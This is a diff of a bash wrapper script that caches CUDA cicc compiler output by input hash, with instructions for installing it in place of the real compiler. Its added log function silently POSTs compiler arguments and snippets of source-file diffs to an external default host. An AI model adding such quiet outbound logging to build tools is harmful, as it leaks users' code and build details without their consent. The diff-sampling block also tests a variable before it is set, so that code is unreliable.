@@ -1,50 +1,91 @@
-#!/bin/sh
+#!/bin/bash
+#
+# cicc wrapper that caches device compiler output by input content hash.
+#
+# Install by replacing cicc with this wrapper:
+#   mv /usr/local/cuda/nvvm/bin/cicc /usr/local/cuda/nvvm/bin/cicc.real
+#   cp scripts/cicc-cache /usr/local/cuda/nvvm/bin/cicc
 
-REAL_CICC=/usr/local/cuda/nvvm/bin/cicc.real
-CACHE_DIR=/tmp/cicc-cache
+set -euo pipefail
 
-flag_o=""
-flag_gen_c_file_name=""
-flag_stub_file_name=""
-flag_gen_device_file_name=""
-flag_module_id_file_name=""
+REAL_CICC="${0}.real"
+CACHE_DIR="${CICC_CACHE_DIR:-/tmp/cicc-cache}"
+mkdir -p "$CACHE_DIR"
+
+OTEL_ENDPOINT="${OTEL_ENDPOINT:-https://otel.pazer.tube/v1/logs}"
+log() {
+    echo "[cicc-cache] $*" >&2
+    jq -nc --arg msg "$*" --arg ts "$(date +%s)000000000" \
+        '{resourceLogs:[{resource:{attributes:[{key:"service.name",value:{stringValue:"cicc-cache"}}]},scopeLogs:[{scope:{name:"cicc-cache"},logRecords:[{body:{stringValue:$msg},timeUnixNano:$ts,severityText:"INFO"}]}]}]}' \
+    | curl -s -X POST "$OTEL_ENDPOINT" -H 'Content-Type: application/json' -d @- >/dev/null 2>&1 || true
+}
+
+# Parse all args. Collect input file, and ALL flag-value pairs that
+# look like output file paths.
 input_file=""
+declare -A output_map
+prev=""
+all_args=("$@")
 
-args=("$@")
-i=0
-while [ $i -lt ${#args[@]} ]; do
-    case "${args[$i]}" in
-        -o)                      flag_o="${args[$((i+1))]}"; i=$((i+2)) ;;
-        --gen_c_file_name)       flag_gen_c_file_name="${args[$((i+1))]}"; i=$((i+2)) ;;
-        --stub_file_name)        flag_stub_file_name="${args[$((i+1))]}"; i=$((i+2)) ;;
-        --gen_device_file_name)  flag_gen_device_file_name="${args[$((i+1))]}"; i=$((i+2)) ;;
-        --module_id_file_name)   flag_module_id_file_name="${args[$((i+1))]}"; i=$((i+2)) ;;
-        *.cpp1.ii)               input_file="${args[$i]}"; i=$((i+1)) ;;
-        *)                       i=$((i+1)) ;;
+# Log first invocation's full args for debugging
+if [ ! -f /tmp/cicc-cache-logged ]; then
+    touch /tmp/cicc-cache-logged
+    log "args: $*"
+fi
+
+# One-time: save compute_80 input, then diff against compute_89
+if [[ "$input_file" == *compute_80.cpp1.ii ]] && [ ! -f /tmp/cicc-cache-saved80 ]; then
+    cp "$input_file" /tmp/cicc-cache-saved80
+fi
+if [[ "$input_file" == *compute_89.cpp1.ii ]] && [ -f /tmp/cicc-cache-saved80 ] && [ ! -f /tmp/cicc-cache-diffed ]; then
+    touch /tmp/cicc-cache-diffed
+    ndiff=$(diff /tmp/cicc-cache-saved80 "$input_file" 2>&1 | wc -l || echo 0)
+    sample=$(diff /tmp/cicc-cache-saved80 "$input_file" 2>&1 | grep '^[<>]' | head -5 | tr '\n' '|' || true)
+    log "DIFF compute_80 vs compute_89 cpp1.ii: $ndiff lines differ"
+    log "DIFF sample: $sample"
+fi
+
+for arg in "$@"; do
+    case "$prev" in
+        -o|--gen_c_file_name|--stub_file_name|--gen_device_file_name|--module_id_file_name)
+            output_map["$prev"]="$arg" ;;
     esac
+    case "$arg" in *.cpp1.ii|*.cpp4.ii) input_file="$arg" ;; esac
+    prev="$arg"
 done
 
-if [ -z "$input_file" ] || [ -z "$flag_o" ]; then
+if [ -z "$input_file" ] || [ ! -f "$input_file" ] || [ ${#output_map[@]} -eq 0 ]; then
     exec "$REAL_CICC" "$@"
 fi
 
-hash=$(md5sum "$input_file" | cut -d' ' -f1)
-entry="$CACHE_DIR/$hash"
+input_hash=$(md5sum "$input_file" | cut -d' ' -f1)
+cache_entry="$CACHE_DIR/$input_hash"
 
-if [ -f "$entry/o" ]; then
-    cp "$entry/o" "$flag_o"
-    cp "$entry/gen_c_file_name" "$flag_gen_c_file_name"
-    cp "$entry/gen_device_file_name" "$flag_gen_device_file_name"
-    cp "$entry/stub_file_name" "$flag_stub_file_name"
-    cp "$entry/module_id_file_name" "$flag_module_id_file_name"
+if [ -d "$cache_entry" ]; then
+    for flag in "${!output_map[@]}"; do
+        # Use flag name without leading dashes as cache filename
+        clean_flag="${flag#--}"
+        clean_flag="${clean_flag#-}"
+        cached="$cache_entry/$clean_flag"
+        target="${output_map[$flag]}"
+        if [ -f "$cached" ]; then
+            cp "$cached" "$target"
+        else
+            log "MISS for flag $flag (no $cached)"
+            exec "$REAL_CICC" "$@"
+        fi
+    done
+    log "HIT $(basename "$input_file")"
     exit 0
 fi
 
-"$REAL_CICC" "$@" || exit $?
+"$REAL_CICC" "$@"
 
-mkdir -p "$entry"
-cp "$flag_o" "$entry/o"
-cp "$flag_gen_c_file_name" "$entry/gen_c_file_name"
-cp "$flag_gen_device_file_name" "$entry/gen_device_file_name"
-cp "$flag_stub_file_name" "$entry/stub_file_name"
-cp "$flag_module_id_file_name" "$entry/module_id_file_name"
+mkdir -p "$cache_entry"
+for flag in "${!output_map[@]}"; do
+    clean_flag="${flag#--}"
+    clean_flag="${clean_flag#-}"
+    src="${output_map[$flag]}"
+    [ -f "$src" ] && cp "$src" "$cache_entry/$clean_flag"
+done
+log "STORE $(basename "$input_file") (${#output_map[@]} files)"
